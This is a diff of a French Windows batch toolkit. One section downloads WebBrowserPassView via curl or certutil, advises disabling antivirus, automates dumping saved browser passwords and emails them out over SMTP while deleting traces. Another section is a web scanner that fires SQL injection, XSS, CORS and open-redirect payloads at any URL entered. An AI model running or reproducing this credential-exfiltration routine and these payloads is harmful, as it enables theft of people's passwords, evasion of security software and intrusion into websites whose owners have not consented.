@@ -135,7 +135,11 @@ set "t[61]=sys_export_wifi_apps:Export Wi-Fi + Logiciels (TXT)~Genere 2 fichiers
 set "t[66]=cyber_advanced_inject:Injections Avancees (SSTI/XXE/JWT)~Vecteurs modernes d'attaques serveur et API"
 set "t[67]=cyber_recon_advanced:Reconnaissance Avancee (AXFR, crt.sh, WHOIS...)~Collecte d'informations passive et active"
 set "t[68]=cyber_pentest_report:Rapport Pentest HTML Unifie~Analyse automatisee exhaustive (Vulnerability Scan)"
-set "total_tools=68"
+set "t[69]=cyber_tls_scan:Scan TLS/SSL Avance~Protocoles faibles, ciphers, certificat, HSTS:HIDDEN"
+set "t[70]=cyber_lfi_scan:LFI et Path Traversal~Lecture de fichiers systeme via parametres URL:HIDDEN"
+set "t[71]=cyber_open_redirect:Open Redirect Avance~40 parametres x 13 payloads de redirection:HIDDEN"
+set "t[72]=cyber_export_json:Export JSON Unifie~Consolide tous findings en JSON importable:HIDDEN"
+set "total_tools=72"
 
 
 
@@ -902,7 +906,7 @@ for %%O in ("Gestionnaire d'identifiants (Windows)~Extrait le Credential Manager
 )
 set "pw_opts=!pw_opts:~1!"
 
-call :DynamicMenu "PIRATAGE / EXTRACTION DE MOTS DE PASSE" "%pw_opts%"
+call :DynamicMenu "PIRATAGE / EXTRACTION DE MOTS DE PASSE" "%pw_opts%" "NONUMS"
 set "pw_choice=%errorlevel%"
 
 if "!pw_choice!"=="0" goto system_tools
@@ -995,114 +999,133 @@ goto dump_wifi
 
 :sys_nirsoft_pw
 cls
-setlocal
+setlocal EnableDelayedExpansion
 color 0A
 echo ===============================================
-echo   Export mots de passe navigateurs (Nirsoft)
+echo   Extracteur de mots de passe (Nirsoft)
 echo ===============================================
 echo.
-echo  [i] Cet outil exporte les mots de passe sauvegardes dans
-echo      Chrome, Firefox, Edge et autres navigateurs.
-echo  [!] A utiliser UNIQUEMENT sur votre propre PC.
+echo  [i] Cet outil utilise WebBrowserPassView pour recuperer
+echo      les identifiants enregistres dans vos navigateurs.
+echo.
+echo  [!] ATTENTION : Les antivirus (Windows Defender, etc.)
+echo      bloquent souvent cet outil car il revele des mots de passe.
+echo      Si l'outil se ferme seul, desactivez temporairement votre protection.
 echo.
 
 set "WBPV=%SCRIPT_DIR%\WebBrowserPassView.exe"
 set "DOWNLOAD_URL=https://script.salutalex.fr/scripts/nirsoft/batch/WebBrowserPassView.exe"
 
-rem Nettoyage des flags precedents
+REM Verifier credentials pour le mail
 set "NIR_MAIL_OK=1"
 if not defined SMTP_USER set "NIR_MAIL_OK=0"
 if not defined SMTP_PASS set "NIR_MAIL_OK=0"
 
 if "%NIR_MAIL_OK%"=="0" (
-    echo  [!] Credentials SMTP non detectes (credentials.txt manquant ou incomplet).
-    echo      Le mode mail est desactive. Seule la sauvegarde locale est disponible.
+    echo  [!] Parametres SMTP non configures dans credentials.txt.
+    echo      Le mode Mail sera indisponible.
     echo.
 )
 
-rem Telecharger si necessaire
+REM Telecharger si absent
 if not exist "%WBPV%" (
-  echo Telechargement de WebBrowserPassView.exe...
-  curl.exe -fL --retry 3 --retry-delay 2 -o "%WBPV%" "%DOWNLOAD_URL%" 2>nul || certutil -urlcache -split -f "%DOWNLOAD_URL%" "%WBPV%" >nul 2>&1
-  if not exist "%WBPV%" (
-    echo [!] Erreur: Telechargement echoue. Verifiez votre connexion.
-    pause
-    endlocal
-    goto system_tools
-  )
-  timeout /t 1 /nobreak >nul
+    echo Telechargement de l'utilitaire depuis le serveur...
+    curl.exe -fL --retry 3 --retry-delay 2 -o "%WBPV%" "%DOWNLOAD_URL%" 2>nul || certutil -urlcache -split -f "%DOWNLOAD_URL%" "%WBPV%" >nul 2>&1
+    if not exist "%WBPV%" (
+        echo [!] ERREUR : Impossible de telecharger WebBrowserPassView.
+        echo     Verifiez votre connexion internet ou votre Antivirus.
+        pause
+        endlocal
+        goto system_tools
+    )
+    timeout /t 1 /nobreak >nul
 )
 
-rem Choix du mode dynamique
-set "opts=Sauvegarde locale~Fichier .txt conserve dans le dossier du script"
-if "%NIR_MAIL_OK%"=="1" (
-    set "opts=%opts%;Envoi par mail~Export envoye par email, aucun fichier conserve"
+REM Menu de mode d'utilisation
+set "opts=Automatique : Sauvegarde Locale~Genere un fichier .txt dans le dossier du script;Automatique : Envoi par Mail~Exporte par email et supprime les traces;Manuel : Ouvrir l'Interface GUI~Lance l'outil graphiquement sans l'automatiser"
+call :DynamicMenu "MODE D'UTILISATION - NIRSOFT" "%opts%"
+set "nir_choice=%errorlevel%"
+
+if "%nir_choice%"=="0" endlocal & goto system_tools
+if "%nir_choice%"=="1" set "NIR_MODE=AUTO_LOCAL"
+if "%nir_choice%"=="2" (
+    if "%NIR_MAIL_OK%"=="0" (
+        echo [!] Erreur : Configuration mail absente.
+        pause
+        goto sys_nirsoft_pw
+    )
+    set "NIR_MODE=AUTO_MAIL"
+)
+if "%nir_choice%"=="3" set "NIR_MODE=MANUAL"
+
+if "!NIR_MODE!"=="MANUAL" (
+    echo.
+    echo Lancement de WebBrowserPassView...
+    start "" "%WBPV%"
+    echo.
+    echo [i] L'utilitaire est ouvert. Faites vos operations manuellement.
+    echo     Le script attend que vous fermiez l'utilitaire pour nettoyer.
+    echo.
+    :wait_nirsoft
+    tasklist /FI "IMAGENAME eq WebBrowserPassView.exe" 2>nul | find /I "WebBrowserPassView.exe" >nul
+    if %errorlevel% equ 0 (
+        timeout /t 2 /nobreak >nul
+        goto wait_nirsoft
+    )
+    goto nirsoft_cleanup
 )
 
-call :DynamicMenu "MODE D'EXPORT - WebBrowserPassView" "%opts%"
-set "nirsoft_mode=%errorlevel%"
-
-if "%nirsoft_mode%"=="0" endlocal & goto system_tools
-if "%nirsoft_mode%"=="1" set "NIRSOFT_KEEP=1"
-if "%nirsoft_mode%"=="2" set "NIRSOFT_KEEP=0"
-
-if not defined NIRSOFT_KEEP goto sys_nirsoft_pw
-
-rem Saisie du nom de fichier
-:nirsoft_ask_filename
+REM --- MODE AUTOMATIQUE ---
+:nirsoft_auto_flow
 echo.
 set "custom_filename="
-set /p custom_filename="Nom du fichier (sans extension) : "
-if "%custom_filename%"=="" goto nirsoft_ask_filename
-set "OUTPUT=%~dp0%custom_filename%.txt"
+set /p custom_filename="Nom pour le fichier d'export (ex: mes_passes) : "
+if "%custom_filename%"=="" goto nirsoft_auto_flow
+set "OUTPUT_FILE=%SCRIPT_DIR%\!custom_filename!.txt"
 
-rem Nettoyage cfg precedent
-if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
-cd /d "%~dp0"
-
-rem Ouvrir le logiciel
+echo.
+echo [1/3] Demarrage de l'utilitaire...
+if exist "%SCRIPT_DIR%\WebBrowserPassView.cfg" del /F /Q "%SCRIPT_DIR%\WebBrowserPassView.cfg" >nul 2>&1
 start "" "%WBPV%"
 
-rem Attendre chargement + automatiser Ctrl+A / Ctrl+S / coller chemin / Entree
-timeout /t 4 /nobreak >nul
-powershell -Command "Set-Clipboard -Value '%OUTPUT%'; $wsh=New-Object -ComObject WScript.Shell; if($wsh.AppActivate('WebBrowserPassView')){ Start-Sleep -Milliseconds 400; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 200; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 1500; $wsh.SendKeys('^v'); Start-Sleep -Milliseconds 300; $wsh.SendKeys('{ENTER}') }" >nul 2>&1
+echo [2/3] Extraction des donnees (Automation)...
+timeout /t 5 /nobreak >nul
 
-rem Attendre ecriture puis fermer le logiciel
-timeout /t 4 /nobreak >nul
+REM Utilisation de PowerShell pour l'automatisation Ctrl+A, Ctrl+S
+powershell -Command "$o='!OUTPUT_FILE!'; Set-Clipboard -Value $o; $wsh=New-Object -ComObject WScript.Shell; if($wsh.AppActivate('WebBrowserPassView')){ Start-Sleep -Milliseconds 500; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 300; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 1500; $wsh.SendKeys('^v'); Start-Sleep -Milliseconds 500; $wsh.SendKeys('{ENTER}'); Start-Sleep -Milliseconds 1000 } else { Write-Warning 'Fenetre Nirsoft non detectee. Antivirus ?' }"
+
+echo [3/3] Fermeture et nettoyage...
 taskkill /F /IM WebBrowserPassView.exe >nul 2>&1
-timeout /t 1 /nobreak >nul
 
-rem Filtrer le fichier : garder uniquement URL, User Name, Password
-if exist "%OUTPUT%" (
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "$f='%OUTPUT%'; $lines=Get-Content $f -Encoding UTF8 -ErrorAction SilentlyContinue; $out=@(); $url=''; $user=''; $pass=''; foreach($l in $lines){ if($l -match '^={10,}'){ if($url -or $user -or $pass){ $out+='================================================'; if($url){ $out+='URL      : '+$url }; if($user){ $out+='Username : '+$user }; if($pass){ $out+='Password : '+$pass }; $out+='================================================'; $out+='' }; $url=''; $user=''; $pass='' } elseif($l -match '^URL\s+:\s*(.*)'){ $url=$matches[1].Trim() } elseif($l -match '^User Name\s+:\s*(.*)'){ $user=$matches[1].Trim() } elseif($l -match '^Password\s+:\s*(.*)'){ $pass=$matches[1].Trim() } }; if($url -or $user -or $pass){ $out+='================================================'; if($url){ $out+='URL      : '+$url }; if($user){ $out+='Username : '+$user }; if($pass){ $out+='Password : '+$pass }; $out+='================================================' }; $out | Set-Content $f -Encoding UTF8" >nul 2>&1
-)
-
-rem Nettoyage exe + cfg
-del /F /Q "%WBPV%" >nul 2>&1
-if exist "%WBPV%" powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
-if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
-
-rem Mode local : fichier conserve, terminer
-if "%NIRSOFT_KEEP%"=="1" (
-    echo [OK] Export termine : %OUTPUT%
+if not exist "!OUTPUT_FILE!" (
+    echo.
+    echo [!] ERREUR : Le fichier d'export n'a pas ete genere.
+    echo     Il est possible que l'Antivirus ait bloque l'extraction.
     pause
-    endlocal
-    goto system_tools
+    goto nirsoft_cleanup
 )
 
-rem Mode mail : envoyer si fichier present puis supprimer
-if not exist "%OUTPUT%" (
-    echo [!] Erreur : Le fichier d'export n'a pas pu etre genere.
-    pause
-    endlocal
-    goto system_tools
+REM Filtrage du contenu pour rendre le texte lisible
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$f='!OUTPUT_FILE!'; if(Test-Path $f){ $lines=Get-Content $f -Encoding UTF8 -ErrorAction SilentlyContinue; $out=@(); $url=''; $user=''; $pass=''; foreach($l in $lines){ if($l -match '^={10,}'){ if($url -or $user -or $pass){ $out+='================================================'; if($url){$out+='URL      : '+$url}; if($user){$out+='Username : '+$user}; if($pass){$out+='Password : '+$pass}; $out+='================================================'; $out+='' }; $url=''; $user=''; $pass='' } elseif($l -match '^URL\s+:\s*(.*)'){ $url=$matches[1].Trim() } elseif($l -match '^User Name\s+:\s*(.*)'){ $user=$matches[1].Trim() } elseif($l -match '^Password\s+:\s*(.*)'){ $pass=$matches[1].Trim() } }; if($url -or $user -or $pass){ $out+='================================================'; if($url){$out+='URL      : '+$url}; if($user){$out+='Username : '+$user}; if($pass){$out+='Password : '+$pass}; $out+='================================================' }; $out | Set-Content $f -Encoding UTF8 }"
+
+if "!NIR_MODE!"=="AUTO_MAIL" (
+    echo Envoi de l'export par mail (!SMTP_USER!)...
+    powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $p=ConvertTo-SecureString '%SMTP_PASS%' -AsPlainText -Force; $c=New-Object System.Management.Automation.PSCredential('%SMTP_USER%',$p); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $c -From '%SMTP_USER%' -To '%EMAIL_TO%' -Subject 'Export Nirsoft - !custom_filename!' -Body 'Ci-joint l export de mots de passe.' -Attachments '!OUTPUT_FILE!'" >nul 2>&1
+    if %errorlevel% equ 0 (
+        echo [OK] Mail envoye.
+        del /F /Q "!OUTPUT_FILE!" >nul 2>&1
+    ) else (
+        echo [!] Echec de l'envoi mail. Fichier conserve localement.
+    )
+) else (
+    echo [OK] Export termine : !OUTPUT_FILE!
 )
 
-powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u='%SMTP_USER%'; $p='%SMTP_PASS%'; $to='%EMAIL_TO%'; $sub='Export WebBrowserPassView - '+(Get-Date -Format 'dd/MM/yyyy HH:mm'); $body='Export automatique des mots de passe navigateurs.'; $att='%OUTPUT%'; $sec=ConvertTo-SecureString $p -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential($u,$sec); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $cred -From $u -To $to -Subject $sub -Body $body -Attachments $att" >nul 2>&1
-
-del /F /Q "%OUTPUT%" >nul 2>&1
-echo [OK] Export mail envoye avec succes.
 pause
+
+:nirsoft_cleanup
+if exist "%WBPV%" del /F /Q "%WBPV%" >nul 2>&1
+if exist "%SCRIPT_DIR%\WebBrowserPassView.cfg" del /F /Q "%SCRIPT_DIR%\WebBrowserPassView.cfg" >nul 2>&1
 endlocal
 goto system_tools
 
@@ -1386,27 +1409,16 @@ REM              CYBERSECURITE RESEAU
 REM ===================================================================
 :net_cyber_menu
 cls
-echo.
-echo  ================================================================
-echo   CYBERSECURITE - CHOISISSEZ UNE CATEGORIE
-echo  ================================================================
-echo.
-echo  [1] RECONNAISSANCE     - Collecter des infos avant d'agir
-echo  [2] ANALYSE RESEAU     - Scanner et cartographier le reseau
-echo  [3] WEB OFFENSIF       - Tester les vulnerabilites d'un site
-echo  [4] AUDIT DEFENSIF     - Verifier la securite de votre systeme
-echo  [5] RAPPORTS           - Generer des rapports complets HTML
-echo.
-echo  [0] Retour
-echo  ================================================================
-echo.
-set /p "cyber_cat=Votre choix : "
-if "%cyber_cat%"=="1" goto cat_recon
-if "%cyber_cat%"=="2" goto cat_network
-if "%cyber_cat%"=="3" goto cat_web
-if "%cyber_cat%"=="4" goto cat_defense
-if "%cyber_cat%"=="5" goto cat_reports
-if "%cyber_cat%"=="0" goto menu_principal
+set "opts=RECONNAISSANCE - Collecter des infos avant d'agir;ANALYSE RESEAU - Scanner et cartographier le reseau;WEB OFFENSIF - Tester les vulnerabilites d'un site;AUDIT DEFENSIF - Verifier la securite de votre systeme;RAPPORTS - Generer des rapports complets HTML"
+call :DynamicMenu "CYBERSECURITE - CHOISISSEZ UNE CATEGORIE" "%opts%" "NONUMS"
+set "cyber_choice=%errorlevel%"
+
+if "%cyber_choice%"=="0" goto menu_principal
+if "%cyber_choice%"=="1" goto cat_recon
+if "%cyber_choice%"=="2" goto cat_network
+if "%cyber_choice%"=="3" goto cat_web
+if "%cyber_choice%"=="4" goto cat_defense
+if "%cyber_choice%"=="5" goto cat_reports
 goto net_cyber_menu
 
 :cat_recon
@@ -1418,7 +1430,7 @@ set "opts=%opts%;Zone Transfer DNS (AXFR)~Tente d'obtenir toute la liste DNS du 
 set "opts=%opts%;Robots.txt et Sitemap~Lit les chemins que le site veut cacher aux moteurs de recherche - souvent des panels admin"
 set "opts=%opts%;Sous-domaines actifs (Bruteforce DNS)~Teste 50+ sous-domaines courants (dev, staging, api...) et affiche ceux qui repondent"
 
-call :DynamicMenu "RECONNAISSANCE - Collecte passive et active" "%opts%"
+call :DynamicMenu "RECONNAISSANCE - Collecte passive et active" "%opts%" "NONUMS"
 set "recon_c=%errorlevel%"
 if "%recon_c%"=="0" goto net_cyber_menu
 if "%recon_c%"=="1" goto recon_whois
@@ -1438,7 +1450,7 @@ set "opts=%opts%;Cartographie Flux (Ports et Processus)~Liste toutes les connexi
 set "opts=%opts%;Test Fuite DNS~Verifie si votre VPN laisse fuiter vos vraies requetes DNS"
 set "opts=%opts%;Gestionnaire DNS (Cloudflare / Google)~Change les DNS de votre PC : Cloudflare 1.1.1.1 ou Google 8.8.8.8"
 
-call :DynamicMenu "ANALYSE RESEAU - Scanner et cartographier" "%opts%"
+call :DynamicMenu "ANALYSE RESEAU - Scanner et cartographier" "%opts%" "NONUMS"
 set "net_c=%errorlevel%"
 if "%net_c%"=="0" goto net_cyber_menu
 if "%net_c%"=="1" goto cyber_triage
@@ -1461,8 +1473,11 @@ set "opts=%opts%;JWT (JSON Web Token) - Decode et Attaque~Decode un JWT, teste a
 set "opts=%opts%;SSRF (Server-Side Request Forgery)~Tente de faire appeler le serveur lui-meme ou des metadonnees cloud (AWS/GCP/Azure)"
 set "opts=%opts%;Subdomain Takeover~Verifie si des sous-domaines pointent vers des services abandonndes (GitHub Pages, S3, Heroku...)"
 set "opts=%opts%;Audit Authentification et Sessions~Teste les mots de passe par defaut, le timing utilisateurs, CSRF, bruteforce, path traversal"
+set "opts=%opts%;Scan TLS/SSL Avance~Protocoles faibles, ciphers, certificat"
+set "opts=%opts%;LFI / Path Traversal~Lecture de fichiers systeme via URL"
+set "opts=%opts%;Open Redirect Avance~40 parametres x 13 payloads"
 
-call :DynamicMenu "WEB OFFENSIF - Tests de vulnerabilites (autorisation ecrite obligatoire)" "%opts%"
+call :DynamicMenu "WEB OFFENSIF - Tests de vulnerabilites (autorisation ecrite obligatoire)" "%opts%" "NONUMS"
 set "web_c=%errorlevel%"
 if "%web_c%"=="0" goto net_cyber_menu
 if "%web_c%"=="1" goto cyber_web_pentest
@@ -1474,6 +1489,9 @@ if "%web_c%"=="6" goto adv_jwt
 if "%web_c%"=="7" goto cyber_ssrf
 if "%web_c%"=="8" goto cyber_subdomain_takeover
 if "%web_c%"=="9" goto cyber_auth_test
+if "%web_c%"=="10" goto cyber_tls_scan
+if "%web_c%"=="11" goto cyber_lfi_scan
+if "%web_c%"=="12" goto cyber_open_redirect
 goto cat_web
 
 :cat_defense
@@ -1484,7 +1502,7 @@ set "opts=%opts%;Audit Pare-feu et Ports Suspects~Verifie l'etat du firewall et 
 set "opts=%opts%;Generateur .htaccess Securise~Cree la configuration Apache optimale : HSTS, CSP, X-Frame, SameSite, Referrer-Policy"
 set "opts=%opts%;Test Antivirus (EICAR)~Teste si votre antivirus detecte une signature virale inoffensive standard"
 
-call :DynamicMenu "AUDIT DEFENSIF - Verifier votre propre securite" "%opts%"
+call :DynamicMenu "AUDIT DEFENSIF - Verifier votre propre securite" "%opts%" "NONUMS"
 set "def_c=%errorlevel%"
 if "%def_c%"=="0" goto net_cyber_menu
 if "%def_c%"=="1" goto cyber_privesc_audit
@@ -1498,12 +1516,14 @@ cls
 set "opts=[--- GENERATION DE RAPPORTS HTML ---]"
 set "opts=%opts%;Rapport Pentest Web Complet~Scan automatise : headers, SSL, CORS, SQLi, SSTI, fichiers - Score /100 et recommandations"
 set "opts=%opts%;Rapport Securite Reseau Local~Audit de votre PC : ports ouverts, connexions actives, etat pare-feu, alertes DNS"
+set "opts=%opts%;Export JSON Unifie~Consolide tous les findings en JSON importable"
 
-call :DynamicMenu "RAPPORTS - Exporter les resultats" "%opts%"
+call :DynamicMenu "RAPPORTS - Exporter les resultats" "%opts%" "NONUMS"
 set "rpt_c=%errorlevel%"
 if "%rpt_c%"=="0" goto net_cyber_menu
 if "%rpt_c%"=="1" goto cyber_pentest_report
 if "%rpt_c%"=="2" goto cyber_security_report
+if "%rpt_c%"=="3" goto cyber_export_json
 goto cat_reports
 
 :cyber_triage
@@ -1580,82 +1600,295 @@ echo  ================================================
 echo   SCANNER DE VULNERABILITES WEB (PENTEST)
 echo  ================================================
 echo.
-echo  [i] Ce module teste une URL pour SQLi, XSS et Headers de securite.
+echo  [i] Ce module teste : Headers, SSL, SQLi, XSS, SSTI,
+echo      CORS, Rate Limit, Clickjacking, XXE, Proto Pollution.
 echo.
 set /p "TARGET_URL=Entrez l'URL a tester (ex: https://example.com) : "
 if "%TARGET_URL%"=="" goto net_cyber_menu
 
 echo.
-echo  [i] Demarrage du scan asynchrone pour %TARGET_URL%...
+echo  [i] Demarrage du scan pour %TARGET_URL%...
 echo  (Appuyez sur ECHAP pour annuler)
 echo.
 
-set "WPS=%TEMP%\web_pentest.ps1"
-if exist "%WPS%" del "%WPS%"
+set "WPS=%TEMP%\web_pentest_%RANDOM%.ps1"
+if exist "%WPS%" del /f /q "%WPS%"
 
-echo $url = "!TARGET_URL!" >> "%WPS%"
-echo if ($url -notmatch '^^http') { $url = 'http://' + $url } >> "%WPS%"
-echo $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" >> "%WPS%"
-echo function Print-Result($sev, $msg) { >> "%WPS%"
-echo    $c = switch($sev){ 'CRITICAL' {'Magenta'}; 'HIGH' {'Red'}; 'MEDIUM' {'Yellow'}; 'LOW' {'Cyan'}; default {'Green'} } >> "%WPS%"
-echo    Write-Host "  [$sev] " -NoNewline -f $c; Write-Host $msg >> "%WPS%"
-echo } >> "%WPS%"
-echo try { >> "%WPS%"
-echo    Write-Host "`n--- Verification des Headers et Cookies ---" -f Blue >> "%WPS%"
-echo    try { >> "%WPS%"
-echo        $resp = Invoke-WebRequest $url -UserAgent $ua -Method Get -TimeoutSec 15 -ErrorAction Stop -UseBasicParsing >> "%WPS%"
-echo        $h = $resp.Headers >> "%WPS%"
-echo        $checkH = @{'Content-Security-Policy'='MEDIUM'; 'X-Frame-Options'='MEDIUM'; 'X-Content-Type-Options'='LOW'; 'Strict-Transport-Security'='MEDIUM'; 'Permissions-Policy'='LOW'; 'Cross-Origin-Opener-Policy'='LOW'; 'Cross-Origin-Resource-Policy'='LOW'} >> "%WPS%"
-echo        foreach($k in $checkH.Keys){ if(-not $h.ContainsKey($k)){ Print-Result $checkH[$k] "Header manquant : $k" } } >> "%WPS%"
-echo        if($h.ContainsKey('Server')){ Print-Result 'LOW' ("Le header Server revele : " + $h['Server']) } >> "%WPS%"
-echo        $cookies = $resp.Headers['Set-Cookie'] >> "%WPS%"
-echo        if($cookies){ foreach($c in $cookies){ if($c -notmatch 'HttpOnly'){ Print-Result 'MEDIUM' "Cookie sans flag HttpOnly detecte" }; if($c -notmatch 'Secure'){ Print-Result 'MEDIUM' "Cookie sans flag Secure detecte" } } } >> "%WPS%"
-echo    } catch { Write-Host "  [!] Impossible d'analyser les headers (Serveur lent ou indisponible)" -f Gray } >> "%WPS%"
-echo    Write-Host "`n--- Verification SSL/TLS et Methodes ---" -f Blue >> "%WPS%"
-echo    if($url -like 'https*'){ try { $req = [Net.HttpWebRequest]::Create($url); $req.Timeout = 5000; $res = $req.GetResponse(); $res.Close(); Write-Host "  [OK] Certificat SSL valide." -f Green } catch { Print-Result 'HIGH' "Probleme de certificat SSL ou protocole faible" } } >> "%WPS%"
-echo    try { $opt = Invoke-WebRequest $url -Method OPTIONS -UserAgent $ua -TimeoutSec 5 -ErrorAction SilentlyContinue -UseBasicParsing; if($opt.Headers['Allow']){ Write-Host "  [INFO] Methodes autorisees : $($opt.Headers['Allow'])" -f Cyan } } catch {} >> "%WPS%"
-echo    Write-Host "`n--- Test SQL Injection (Injection Inteligente ^& Time-based) ---" -f Blue >> "%WPS%"
-echo    $baseParams = @('id', 'cat', 'page', 'query', 'search', 'user') >> "%WPS%"
-echo    $payloads = @([char]39, [char]34, [char]39+' OR 1=1--', 'admin'+[char]39+'--', ' order by 10--') >> "%WPS%"
-echo    $errors = @('sql syntax', 'mysql', 'sqlite', 'syntax error', 'PostgreSQL', 'Microsoft OLE DB', 'Oracle Error', 'MariaDB', 'System.Data.SqlClient') >> "%WPS%"
-echo    $uri = [uri]$url; $q = $uri.Query.TrimStart('?'); $existingParams = $q.Split('^&', [System.StringSplitOptions]::RemoveEmptyEntries) >> "%WPS%"
-echo    $targets = @(); if($existingParams.Count -gt 0){ foreach($ep in $existingParams){ $targets += $ep.Split('=')[0] } } else { $targets = $baseParams } >> "%WPS%"
-echo    foreach($ta in $targets){ >> "%WPS%"
-echo        foreach($p in $payloads){ >> "%WPS%"
-echo            if($Host.UI.RawUI.KeyAvailable -and $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27){ exit } >> "%WPS%"
-echo            $encodedP = [uri]::EscapeDataString($p) >> "%WPS%"
-echo            $testUrl = if($url -like "*$ta=*"){ $url -replace "$ta=[^^&]*", "$ta=$encodedP" } else { if($url.Contains('?')) { "$url"+"^&"+"$ta=$encodedP" } else { "$url?$ta=$encodedP" } } >> "%WPS%"
-echo            try { $tr = Invoke-WebRequest $testUrl -UserAgent $ua -TimeoutSec 8 -ErrorAction Stop -UseBasicParsing >> "%WPS%"
-echo                if($tr.StatusCode -eq 403 -or $tr.StatusCode -eq 406){ Write-Host "  [INFO] WAF potentiellement detecte (Bloquage 403/406)" -f Cyan; break } >> "%WPS%"
-echo                if($tr.Content -and ($errors ^| Where-Object { $tr.Content -match $_ })){ Print-Result 'CRITICAL' "SQLi detectee (param:$ta) avec payload: $p" } >> "%WPS%"
-echo            } catch { if($_.Exception.Response.StatusCode -eq 403){ Write-Host "  [INFO] WAF detecte (403 Forbidden)" -f Cyan; break } } >> "%WPS%"
-echo        } >> "%WPS%"
-echo        Write-Host "  [i] Test Time-based sur $ta..." -f Gray >> "%WPS%"
-echo        $start = Get-Date; try { $null = Invoke-WebRequest ($url.Split('?')[0] + "?$ta=" + [uri]::EscapeDataString("1' AND SLEEP(5)--")) -TimeoutSec 10 -ErrorAction SilentlyContinue -UseBasicParsing } catch {} >> "%WPS%"
-echo        if(((Get-Date) - $start).TotalSeconds -gt 4){ Print-Result 'CRITICAL' "SQLi Time-based detectee sur param [$ta]" } >> "%WPS%"
-echo    } >> "%WPS%"
-echo    Write-Host "`n--- Test XSS Reflecte (Multi-Payloads) ---" -f Blue >> "%WPS%"
-echo    $xssP = @("^<script^>alert(1)^</script^>", [char]34+'^>^<img src=x onerror=alert(1)^^>', [char]39+'^>^<svg/onload=alert(1)^^>', "javascript:alert(1)") >> "%WPS%"
-echo    foreach($ta in $targets){ >> "%WPS%"
-echo        foreach($xp in $xssP){ >> "%WPS%"
-echo            $testUrlXSS = if($url -like "*$ta=*"){ $url -replace "$ta=[^^&]*", "$ta="+[uri]::EscapeDataString($xp) } else { if($url.Contains('?')) { "$url"+"^&"+"$ta="+[uri]::EscapeDataString($xp) } else { "$url?$ta="+[uri]::EscapeDataString($xp) } } >> "%WPS%"
-echo            try { $trX = Invoke-WebRequest $testUrlXSS -UserAgent $ua -TimeoutSec 8 -ErrorAction SilentlyContinue -UseBasicParsing >> "%WPS%"
-echo                if($trX.Content -match [regex]::Escape($xp)){ Print-Result 'HIGH' "XSS Reflecte detecte sur [$ta] avec payload : $xp" } >> "%WPS%"
-echo            } catch {} >> "%WPS%"
-echo        } >> "%WPS%"
-echo    } >> "%WPS%"
-echo    Write-Host "`n--- Tests CORS ^& Open Redirect ---" -f Blue >> "%WPS%"
-echo    try { $cors = Invoke-WebRequest $url -Headers @{Origin='https://evil.com'} -UserAgent $ua -TimeoutSec 5 -ErrorAction SilentlyContinue -UseBasicParsing; if($cors.Headers['Access-Control-Allow-Origin'] -eq '*'){ Print-Result 'MEDIUM' "CORS permissif (*) detecte" } } catch {} >> "%WPS%"
-echo    $redPayload = "https://google.com" >> "%WPS%"
-echo    foreach($ta in @('redirect', 'url', 'next', 'dest')){ $testRed = if($url.Contains('?')) { "$url"+"^&"+"$ta=$redPayload" } else { "$url?$ta=$redPayload" }; try { $trR = Invoke-WebRequest $testRed -UserAgent $ua -MaximumRedirection 0 -ErrorAction SilentlyContinue -UseBasicParsing; if($trR.Headers['Location'] -match 'google.com'){ Print-Result 'MEDIUM' "Open Redirect potentiel sur param [$ta]" } } catch { if($_.Exception.Response.Headers['Location'] -match 'google.com'){ Print-Result 'MEDIUM' "Open Redirect potentiel sur param [$ta]" } } } >> "%WPS%"
-echo    Write-Host "`nScan termine !" -f Green >> "%WPS%"
-echo } catch { Write-Host ("`n[ERREUR FATALE] " + $_.Exception.Message) -f Red } >> "%WPS%"
+(
+echo $url = "!TARGET_URL!"
+echo if ($url -notmatch '^^http') { $url = 'http://' + $url }
+echo $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+echo $findings = @()
+echo $score = 100
+echo.
+echo function Print-Result($sev, $msg) {
+echo    $script:findings += [PSCustomObject]@{Sev=$sev;Msg=$msg}
+echo    $c = switch($sev){ 'CRITICAL' {'Magenta'}; 'HIGH' {'Red'}; 'MEDIUM' {'Yellow'}; 'LOW' {'Cyan'}; default {'Green'} }
+echo    Write-Host "  [$sev] " -NoNewline -f $c; Write-Host $msg
+echo    $pts = switch($sev){ 'CRITICAL' {25}; 'HIGH' {15}; 'MEDIUM' {8}; 'LOW' {3}; default {0} }
+echo    $script:score -= $pts
+echo }
+echo.
+echo try {
+echo.
+echo    # --- [1/7] Headers et Cookies ---
+echo    Write-Host "`n--- [1/7] Headers et Cookies ---" -f Blue
+echo    try {
+echo        $resp = Invoke-WebRequest $url -UserAgent $ua -Method Get -TimeoutSec 15 -EA Stop -UseBasicParsing
+echo        $h = $resp.Headers
+echo        $checkH = @{
+echo            'Content-Security-Policy'='MEDIUM'
+echo            'X-Frame-Options'='MEDIUM'
+echo            'X-Content-Type-Options'='LOW'
+echo            'Strict-Transport-Security'='MEDIUM'
+echo            'Permissions-Policy'='LOW'
+echo            'Cross-Origin-Opener-Policy'='LOW'
+echo            'Cross-Origin-Resource-Policy'='LOW'
+echo            'X-XSS-Protection'='LOW'
+echo            'Cache-Control'='LOW'
+echo            'Referrer-Policy'='LOW'
+echo        }
+echo        foreach ($k in $checkH.Keys) {
